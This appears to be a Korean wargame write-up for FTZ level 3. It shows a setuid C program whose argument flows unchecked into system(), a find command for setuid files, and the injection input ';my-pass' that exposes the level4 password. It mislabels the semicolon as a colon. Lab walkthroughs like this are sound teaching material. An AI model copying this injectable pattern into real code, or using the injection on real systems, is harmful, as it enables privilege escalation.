## level3

#### 실행

``` //
[level3@ftz level3]$cat hint // hint 파일의 내용을 화면에 출력한다.
```

#### 결과

```
다음 코드는 autodig의 소스이다.

#include <stdio.h>
#include <stdlib.h> 
#include <unistd.h>
int main(int argc, char **argv){
 char cmd[100];
 if( argc!=2 ){
 printf( "Auto Digger Version 0.9\n" );
 printf( "Usage : %s host\n", argv[0] );
 exit(0);
 }
 strcpy( cmd, "dig @" );
 strcat( cmd, argv[1] );
 strcat( cmd, " version.bind chaos txt");
 system( cmd );
}

이를 이용하여 level4의 권한을 얻어라.
more hints.
- 동시에 여러 명령어를 사용하려면?
- 문자열 형태로 명령어를 전달하려면? 
```

--------

#### 실행

```
[leve13@ftz level3]$find / -user level4 -perm -4000 2>/dev/null // 루트 디렉토리부터 level4 소유의 최소 setUID가 설정되어 있는 파일을 찾고 표준 에러를 휴지통으로 리다이렉트한다.
```

#### 결과

```/bin/ExceteMe
/bin/autodig
```

---------

#### 실행

```
[level3@ftz level3]$./bin/autodig ";my-pass" //autodig 실행
```

c언어에서 main()에 전달되는 인자의 개수는 argc, main()에 전달되는 문자열은 argv라 한다.

기본적으로 실행 경로나 실행 파일의 이름을 인자로 전달받으므로 argc는 1, argv[0]에는 실행 경로나 실행 파일의 이름이 저장된다.

추가적인 문자열 인자를 전달하고 싶을 때는 실행 파일 이름 뒤에 큰따옴표로 인자를 묶은 후 파일을 실행하면 된다.

동시에 여러 명령어를 실행하기 위해서는 각 명령어를 ;(콜론)으로 나눠줘야 한다.

#### 결과

```
dig: Counldn't find server '': Name or service not known
Level4 Password is "suck my brain"
```
